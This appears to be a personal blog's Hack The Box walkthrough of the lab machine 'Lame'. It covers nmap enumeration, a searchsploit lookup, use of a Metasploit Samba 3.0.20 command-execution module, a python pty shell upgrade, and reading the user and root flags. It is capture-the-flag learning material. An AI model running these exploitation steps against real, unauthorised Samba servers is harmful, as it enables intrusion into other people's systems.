---
title:  "Hack The Box: Lame - Walkthrough"
date:   2020-01-09 19:30:55
---

It's been a while since i've last actively posted something on my blog. I've been really busy with uni and real life stuff but i managed to get some more free time on my hands. Lame was one of the more easier boxes that i've done if i say so myself. Here is my write up :)

![](/assets/3/1.png)

<h2>Enumeration</h2>
Let's start off with our nmap scan.

```
mkdir scans
nmap -sV -sC -oA scans/nmapinitial 10.10.10.3
```

-sC for default scripts, 
-sV for version enumeration, 
-oA for output all formats.

![](/assets/3/2.png)

Couple of interesting results:

- FTP allows anonymous login but when loggin in there wasn't any useful information.
- OpenSSH version is not vulnerable.
- Samba is our injection point.

I ran a searchsploit on the samba version.

```
searchsploit samba 3.0.20
```

![](/assets/3/3.png)

Great an exploit that leads to command execution, lets power up metasploit!

<h2>Exploitation</h2>

```
msfconsole
```

![](/assets/3/4.png)

Lets search for the exploit we just found.

```
search samba 3.0.20
```

![](/assets/3/5.png)

Bunch of results, but the one we found when running searchsploit has ID 14.

```
use 14
```

Let's see what we need to set in the exploit before running it.

```
show options
```

![](/assets/3/6.png)

Looks like we only have to set the rhost, let's go ahead and do that.

```
set rhost 10.10.10.3
```

![](/assets/3/7.png)

Then run it.

```
run
```

![](/assets/3/8.png)

Great, we got in! Quickly checked what the current user was and spawned a TTY shell with:

```
python -c 'import pty; pty.spawn("/bin/sh")'
```

<h2>Getting user.txt</h2>
Let's continue and find the user and root flag. When going through the user folders i found the user.txt file in /home/makis.

![](/assets/3/9.png)

h2>Getting root.txt</h2>
Let's go to the root directory now for root.txt file.

![](/assets/3/10.png)

And there we have it, box done :)

Thanks for reading and happy hacking!

